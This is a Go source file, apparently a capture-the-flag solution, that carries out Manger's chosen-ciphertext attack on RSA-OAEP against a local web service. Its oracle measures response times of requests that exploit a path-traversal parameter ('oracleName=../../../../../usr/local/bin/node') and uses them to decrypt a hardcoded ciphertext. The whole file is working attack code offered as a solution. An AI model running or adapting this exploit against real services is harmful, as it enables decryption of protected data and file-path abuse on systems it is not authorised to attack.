// Use Manger's attack from https://research.kudelskisecurity.com/2018/04/05/breaking-rsa-oaep-with-mangers-attack/ ands timing attack with LFI vulnerability to solve

package main

import (
    "encoding/hex"
    "fmt"
    "net/http"
    "math/big"
    "time"
    "github.com/dvsekhvalnov/jose2go/base64url"

    . "sol/mangerattack"  // replace myproject with whatever name you used in go mod init
)
func get_time(url string) int64 {
    start := time.Now()
    resp, _ := http.Get(url)
    defer resp.Body.Close()
	t := time.Since(start)
    fmt.Println(t, t.Microseconds(), url)
	return t.Microseconds()
}

type Oracle struct {}

func (Oracle) Query(mcfe *big.Int) bool {
	url := "http://localhost:3000/ask?oracleName=../../../../../usr/local/bin/node&question="
	b := mcfe.Bytes()
	t := get_time(url + base64url.Encode(b))
	// short decryptions take around 20-50ms on average
	// long decryptions take 300ms+
	return t < 200000
}

func main() {
	// local values for testing
	N := FromBase16("B9081FCBE46C2E844C671311FD15A08C551EA4E66E193CC81D954421CE96E99D41A9FE84A6FBAB898EBF4FE5D0E2EFE578CFF643DDB77480137B09A88B6A95130E5E5D81451C85C3BEFE28E2284D0C20961238B1354B43C487ECB9C4570E6DE820CAB99F92FC44C7C661FD64F13B5A067F46B0A8617445161DCAF896B0E18F75")
	e := big.NewInt(int64(0x10001))
	ct_raw, _ := base64url.Decode("glgKGkawHLTOs5KjYaFSBMN1Q0r1XktCZXwZLXGCt6XTXnMsHbhdKH-rdl1gQcl7bAm0wOVL2Jz5fwMlfZBySiJ4fU1WQ79PZ391f10f_QiCpX6syglITxFfKNv_CJIEufaql-WjWTSJrulzYEVEUDFwuX1AixiTi0fchuLUVQ4")
	ct_hex := hex.EncodeToString(ct_raw)

	MangerAttack(ct_hex, N, e, Oracle{})
}